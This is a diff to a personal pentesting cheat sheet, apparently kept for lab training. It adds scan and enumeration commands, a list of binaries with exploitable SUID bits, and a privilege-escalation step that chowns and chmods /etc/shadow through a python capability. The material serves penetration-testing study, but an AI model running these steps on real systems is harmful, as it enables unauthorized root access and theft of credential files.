@@ -120,6 +120,7 @@ nmap -p- IP
 
 #Thorough scan
 sudo nmap -sC -sV -p- IP 
+sudo nmap -pPORTS -A IP
 
 #UDP Scan
 sudo nmap -sU IP
@@ -180,6 +181,8 @@ ffuf -w wordlist.txt -u http://FUZZ.IP:PORT
 
 #Directory Enumeration
 ffuf -w wordlist.txt -u http://IP:PORT/FUZZ -recursion
+dirsearch -u http://IP
+
 ##Exentsion Fuzz
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://IP:PORT/blog/indexFUZZ
 
@@ -334,6 +337,7 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
     show tables;
     show columns from table;
     select * from <table> where <column> = "<string>";
+    update <table> set <column> = "<string>" where <column> = "<string>";
 
 #SQLi
     #Write to local file
@@ -368,6 +372,9 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 ```c
 #SUID
     find / -type f -perm -04000 -ls 2>/dev/null
+
+#Capabilities
+	getcap -r / 2>/dev/null
 
 #Cron
     cat /etc/crontab
@@ -443,6 +450,7 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
     whoami /priv
     whoami /groups
     whoami /user
+	whoami /all
     query user  -  logged in users
     echo %USERNAME%  -  current user
     net user  -  all users
@@ -472,6 +480,24 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 
 ### Linux Exploit
 ```c
+#SUID
+	Important SUID:
+		"aa-exec","ab","agetty","alpine","ar","arj","arp","as","ascii-xfr","ash","aspell","atobm","awk","base32","base64","basenc","basez","bash","bc","bridge","busybox","bzip2","cabal","capsh","cat","chmod","choom","chown","chroot","clamscan","cmp","column","comm","cp","cpio","cpulimit","csh","csplit","csvtool","cupsfilter","curl","cut","dash","date","dd","debugfs","dialog","diff","dig","distcc","dmsetup","docker","dosbox","ed","efax","elvish","emacs","env","eqn","espeak","expand","expect","file","find","fish","flock","fmt","fold","gawk","gcore","gdb","genie","genisoimage","gimp","grep","gtester","gzip","hd","head","hexdump","highlight","hping3","iconv","install","ionice","ip","ispell","jjs","join","jq","jrunscript","julia","ksh","ksshell","kubectl","ld.so","less","logsave","look","lua","make","mawk","more","mosquitto","msgattrib","msgcat","msgconv","msgfilter","msgmerge","msguniq","multitime","mv","nasm","nawk","ncftp","nft","nice","nl","nm","nmap","node","nohup","od","openssl","openvpn","pandoc","paste","perf","perl","pexec","pg","php","pidstat","pr","ptx","python","rc","readelf","restic","rev","rlwrap","rsync","rtorrent","run-parts","rview","rvim","sash","scanmem","sed","setarch","setfacl","setlock","shuf","soelim","softlimit","sort","sqlite3","ss","ssh-agent","ssh-keygen","ssh-keyscan","sshpass","start-stop-daemon","stdbuf","strace","strings","sysctl","systemctl","tac","tail","taskset","tbl","tclsh","tee","terraform","tftp","tic","time","timeout","troff","ul","unexpand","uniq","unshare","unsquashfs","unzip","update-alternatives","uudecode","uuencode","vagrant","view","vigr","vim","vimdiff","vipw","w3m","watch","wc","wget","whiptail","xargs","xdotool","xmodmap","xmore","xxd","xz","yash","zsh","zsoelim"
+
+#Capabilities
+	Exploitable: 
+		Python and ruby
+			Looking for cap_setuid+ep  or  cap_setuid=ep  -  go to GTFObins
+			cap_chown+ep - python
+				python -c 'import os;os.chown("/etc/shadow",UID,UID)'
+				chmod 777 /etc/shadow
+		Tar
+			Need cap_dac_override or read
+			Can look at GTFObins
+
+#Inetersting Groups
+	lxd/ lxc
+		Check joplin notes
 ```
 ### Windows Exploit
 ```c
